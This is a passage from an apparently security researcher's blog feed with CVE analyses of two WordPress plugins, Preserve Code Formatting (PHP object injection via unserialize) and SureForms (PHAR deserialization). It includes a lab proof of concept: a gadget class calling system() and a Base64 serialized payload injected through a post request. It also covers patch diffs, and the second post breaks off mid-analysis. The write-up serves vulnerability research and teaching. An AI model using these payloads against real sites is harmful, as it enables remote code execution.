stripped, cleaned, and then passed into &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;As described in the CVE, exploitation requires &lt;strong&gt;Contributor&lt;/strong&gt; privileges to create a post.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor submits Post&#xA;(Content contains malicious Base64 payload)&amp;#34;]&#xA;    --&amp;gt; B[&amp;#34;WordPress calls hook: content_save_pre&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Plugin callback: preserve_postprocess()&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Regex extracts preserve blocks&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;match[2] = Base64 payload&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;base64_decode()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;stripslashes()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;str_replace(chunk_split_token)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;unserialize() on user data (VULNERABLE)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[RCE]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Create a post and intercept the request using Burp Suite.&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with the &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; field containing the serialized and Base64-encoded payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;id&amp;#34;:129,&amp;#34;content&amp;#34;:&amp;#34;{!{code}!}Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ=={!{/code}!}&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Test&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1479&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Versions &lt;code&gt;&amp;lt;= 4.0.1&lt;/code&gt; of the Preserve Code Formatting plugin are critically vulnerable because &lt;code&gt;unserialize()&lt;/code&gt; is called on unvalidated user input. With only Contributor privileges, an attacker can inject a malicious payload that is deserialized during post processing, leading to remote code execution or unauthorized system manipulation. The &lt;code&gt;v5.0&lt;/code&gt; patch eliminates &lt;code&gt;unserialize()&lt;/code&gt;, replaces it with &lt;code&gt;json_decode()&lt;/code&gt;, and adds input validation, effectively neutralizing the Object Injection attack surface.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;unserialize()&lt;/code&gt; on user-controlled data is fundamentally unsafe without strict validation.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;content_save_pre&lt;/code&gt; hook exposes an attack surface because input is processed before sanitization.&lt;/li&gt;&#xA;&lt;li&gt;Contributor privileges are sufficient to exploit the issue in multi-user environments.&lt;/li&gt;&#xA;&lt;li&gt;The patch focuses on switching to safe data handling and applying content validation.&lt;/li&gt;&#xA;&lt;li&gt;Replacing &lt;code&gt;unserialize()&lt;/code&gt; with safer mechanisms like JSON is the correct fix for WordPress plugins facing similar issues.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/preserve-code-formatting/vulnerability/wordpress-preserve-code-formatting-plugin-4-0-1-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6742 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-19-cve-2025-6742/</link>
      <pubDate>Wed, 19 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-19-cve-2025-6742/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;SureForms – Drag and Drop Form Builder for WordPress&lt;/strong&gt; plugin for WordPress contains a &lt;strong&gt;PHP Object Injection&lt;/strong&gt; vulnerability in all versions up to and including 1.7.3 due to the usage of &lt;strong&gt;file_exists()&lt;/strong&gt; in the &lt;strong&gt;delete_entry_files()&lt;/strong&gt; function without restricting the provided path. This allows an unauthenticated attacker to inject a &lt;strong&gt;PHP Object&lt;/strong&gt;. No &lt;strong&gt;POP chain&lt;/strong&gt; is known in the vulnerable software, meaning the vulnerability has no impact unless another plugin or theme installed on the site contains a &lt;strong&gt;POP chain&lt;/strong&gt;. If such a POP chain exists via additional plugins or themes installed on the target system, it may allow the attacker to perform actions such as arbitrary file deletion, sensitive data exposure, or code execution depending on the POP chain present.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6742&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6742&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.7.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.7.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/sureforms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;SureForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diffing tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;In version &lt;code&gt;1.7.3&lt;/code&gt;, the function &lt;code&gt;delete_entry_files()&lt;/code&gt; receives a &lt;code&gt;$file_url&lt;/code&gt;, then decodes the URL and converts it into a path using &lt;code&gt;$file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;It then directly calls:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Delete the file if it exists.&#xA;if ( file_exists( $file_path ) ) {&#xA;    unlink( $file_path );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code checks for file existence using &lt;code&gt;file_exists()&lt;/code&gt; and uses &lt;code&gt;unlink()&lt;/code&gt; to delete it if present.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#34; title=&#34;Changes in the patch&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#39; alt=&#34;Diff&#34; height=&#34;602&#34; width=&#34;1892&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes in the patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patched version, the code is replaced with:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Delete the file from the uploads directory.&#xA;Helper::delete_upload_file_from_subdir( $file_url, &amp;#39;sureforms/&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function delete_upload_file_from_subdir( $file_url, $subdir = &amp;#39;sureforms/&amp;#39; ) {&#xA;    // Decode the file URL.&#xA;    $file_url = urldecode( $file_url );&#xA;&#xA;    // Check if the file URL is empty.&#xA;    if ( empty( $file_url ) || ! is_string( $file_url ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Normalize and sanitize the subdirectory.&#xA;    $subdir = trailingslashit( sanitize_text_field( $subdir ) );&#xA;&#xA;    // Get the base upload directory.&#xA;    $upload_dir       = wp_upload_dir();&#xA;    $base_upload_path = trailingslashit( $upload_dir[&amp;#39;basedir&amp;#39;] ) . $subdir;&#xA;&#xA;    // Extract only the filename from URL.&#xA;    $filename = basename( $file_url );&#xA;&#xA;    // Construct the full file path.&#xA;    $file_path = $base_upload_path . $filename;&#xA;&#xA;    // Resolve real paths.&#xA;    $real_file_path = realpath( $file_path );&#xA;    $real_base_path = realpath( $base_upload_path );&#xA;&#xA;    // Security check: ensure file is inside the target subdir.&#xA;    if ( ! $real_file_path || ! $real_base_path || strpos( $real_file_path, $real_base_path ) !== 0 ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Delete if file exists.&#xA;    if ( file_exists( $real_file_path ) ) {&#xA;        return unlink( $real_file_path );&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The new function &lt;code&gt;delete_upload_file_from_subdir()&lt;/code&gt; performs multiple security checks, only allowing deletion of files located in the &lt;code&gt;uploads/sureforms/&lt;/code&gt; directory with valid filenames.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;According to the description, this CVE is related to a PHP Object Injection vulnerability where the sink is the &lt;code&gt;file_exists()&lt;/code&gt; function, which only occurs in the case of &lt;strong&gt;PHAR Deserialization&lt;/strong&gt;, meaning &lt;code&gt;$file_path&lt;/code&gt; must be in the format &lt;code&gt;phar://phar_file&lt;/code&gt;.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public static function delete_entry_files( $entry_id ) {&#xA;    if ( ! $entry_id ) {&#xA;        return;&#xA;    }&#xA;    // Get the entry data to get the file URLs.&#xA;    $form_data = Entries::get_form_data( $entry_id );&#xA;    if ( empty( $form_data ) ) {&#xA;        return;&#xA;    }&#xA;    foreach ( $form_data as $field_name =&amp;gt; $value ) {&#xA;        // Continue to the next iteration if the field name does not contain &amp;#39;srfm-upload&amp;#39; and value is not an array.&#xA;        if ( false === strpos( $field_name, &amp;#39;srfm-upload&amp;#39; ) &amp;amp;&amp;amp; ! is_array( $value ) ) {&#xA;            continue;&#xA;        }&#xA;        foreach ( $value as $file_url ) {&#xA;            // If the file URL is empty, skip to the next iteration.&#xA;            if ( empty( $file_url ) ) {&#xA;                continue;&#xA;            }&#xA;            $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );&#xA;            // Delete the file if it exists.&#xA;            if ( file_exists( $file_path ) ) {&#xA;                unlink( $file_path );&#xA;            }&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After reviewing the logic in &lt;code&gt;delete_entry_files()&lt;/code&gt;, I noticed keywords like &lt;code&gt;entries&lt;/code&gt; appear frequently. There is a coincidence here:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#34; title=&#34;Entry in UI&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry.png&#34; data-sub-html=&#34;&lt;h2&gt;Entry&lt;/h2&gt;&lt;p&gt;Entry in UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#39; alt=&#34;Entry&#34; height=&#34;636&#34; width=&#34;1342&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entry in UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;It seems correct, but as you can see the message &lt;code&gt;&amp;quot;No records found&amp;quot;&lt;/code&gt;, there is no data to display. So how do we add data?&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$form_data = Entries::get_form_data( $entry_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the function name &lt;code&gt;get_form_data&lt;/code&gt;, it is highly likely that data is retrieved from client form submissions since this vulnerability is published as &lt;strong&gt;Unauthenticated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Try creating a form using the plugin functionality:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#34; title=&#34;Create form&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create 